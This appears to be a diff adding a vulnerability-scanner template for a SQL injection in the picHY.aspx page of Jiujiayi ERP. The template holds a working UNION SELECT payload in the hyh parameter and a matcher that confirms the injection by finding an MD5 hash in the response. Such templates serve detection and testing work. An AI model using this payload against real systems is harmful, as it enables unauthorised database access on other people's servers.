@@ -1,0 +1,20 @@
+id: jiujiayiERP-picHY-sql
+
+info:
+  name: 九佳易ERP picHY.aspx 存在SQL注入漏洞
+  author: jiujiayiERP
+  severity: high
+  tags: jiujiayiERP
+
+http:
+  - raw:
+      - |+
+        GET /HuiYuan/HuiYuanDangAn/picHY.aspx?hyh=1'union+select+sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '202cb962ac59075b964b07152d234b7'
